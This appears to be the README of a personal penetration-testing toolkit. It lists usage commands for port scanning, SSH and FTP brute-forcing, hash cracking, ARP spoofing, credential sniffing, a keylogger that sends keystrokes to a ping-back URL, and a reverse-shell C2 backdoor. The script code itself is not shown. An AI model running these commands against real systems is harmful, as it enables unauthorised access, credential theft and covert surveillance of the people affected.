# A collection of my custom Python Scripts

Everything seems pretty self explanatory. There scripts are standalone, so duplicates of code are unavoidable.

Some extra packages may need to be installed in order for these to work.

There are more sophisticated tools out there that can perform the same functionalities or even better but coding custom tools is always a good mental exercise. You can also get an idea of how these tools, you might be using, work.

**Working with Python >= 3 version**

## Port Scanner

Usage examples:

`python3 portscan.py --host 192.168.1.1 --port 80`

*To specify multiple ports*

`python3 portscan.py --host 192.168.1.1 --port 21,22,25,80`

*To specify a range of ports*

`python3 portscan.py --host 192.168.1.1 --port 1-1000`

*Returns a table of results similar to the nmap.*

## SSH Bruteforcer

Usage examples:

`python3 sshbrute.py --host 192.168.1.1 --usr usersfile.txt --pwd passfile.txt`

*To specify another SSH service port*

`python3 sshbrute.py --host 192.168.1.1 --port 22 --usr usersfile.txt --pwd passfile.txt`

*To reset your session before bruteforce*

`python3 sshbrute.py --host 192.168.1.1 --usr usersfile.txt --pwd passfile.txt --rst`

*Returns a successful user:pass combination.*

## FTP Bruteforcer

Usage examples:

`python3 ftpbrute.py --host 192.168.1.1 --usr usersfile.txt --pwd passfile.txt`

*To specify another FTP service port*

`python3 ftpbrute.py --host 192.168.1.1 --port 21 --usr usersfile.txt --pwd passfile.txt`

*To try anonymous login too on top of wordlist bruteforce*

`python3 ftpbrute.py --host 192.168.1.1 --usr usersfile.txt --pwd passfile.txt --anon`

*To reset your session before bruteforce*

`python3 ftpbrute.py --host 192.168.1.1 --usr usersfile.txt --pwd passfile.txt --rst`

*Returns a successful user:pass combination.*

## Hash Cracker

**Available methods md5, sha1, sha256, sha512**

`python3 hashcracker.py --hash 21232f297a57a5a743894a0e4a801fc3 --method md5 --list userlist.txt`

*Returns a successful plaintext string if cracked*

## Hash Bruteforcer

**Available methods md5, sha1, sha256, sha512**

`python3 hashcracker.py --hash 21232f297a57a5a743894a0e4a801fc3 --method md5`

*Specify a minimum or maximum length for bruteforcing*

`python3 hashcracker.py --hash 21232f297a57a5a743894a0e4a801fc3 --method md5 --minlength 4 --maxlength 8`

*Specify a custom character set for bruteforcing*

`python3 hashcracker.py --hash 21232f297a57a5a743894a0e4a801fc3 --method md5 --minlength 4 --maxlength 8 --chars ABCDabcd1234!@#`

*Returns a successful plaintext string if cracked*

## Mac Changer

*Display your current MAC Address*

`python3 macchanger.py`

`python3 macchanger.py -c`

*Specify an interface*

`python3 macchanger.py -c -i eth0`

*Generate a Random MAC Address on a specified interface (optional)*

`python3 macchanger.py -r -i eth0`

*Manually set a MAC Address on a specified interface (optional)*

`python3 macchanger.py -n 00:11:22:33:44:55 -i eth0`

## ARP Spoofer

*Spoof your target IP with your source IP*

`python3 arpspoofer.py --dst 192.168.1.2 --src 192.168.1.5`

### Remote Execute

*Executes specified commands remotely to specified hosts*

`python3 remote_execute.py -i test.com -c whoami -u root`

`python3 remote_execute.py -i hosts.txt -c cmds.txt -u www-data`

### MAC Sniff

*Sniff traffic and revolve source and destination MAC addresses from packets*

`python3 macsniff.py`

### Credential Sniff

*Sniff plaintext credentials on a specified interface, protocol and port for simple protocols*

*This works for HTTP too but you might have some increased output due to headers such as User-Agent* 

`python3 credsniff.py -p 21`

`python3 credsniff.py -i eth0 -p 21 -t tcp`

### HTTP Credential Sniff

*Sniff plaintext credentials on a specified interface for HTTP requests only*

`python3 credsniff_http.py -i eth0`

### DNS Sniff

*Sniff all DNS queries performed on the specified interface*

`python3 dns_sniff.py -i eth0`

### Keylogger

*Capture keystrokes and send them to a ping back URL. You need to specify the URL inside the script.*

`python3 keylogger.py`

### C2

The c2 directory contains a POC backdoor example using a server and a reverse shell. You can modify the server
port according to your needs or by passing arguments.
You can execute commands as you would do in an msf shell for example.
Additionally you can `download`, `upload`, `cd` to any directory and `exit` the shell. \

Usage example: \
**Server** \
`python3 srv.py -p 8080 -i 0.0.0.0`

**Reverse Shell** \
`python3 rev_shell.py -p 8080 -i 0.0.0.0`
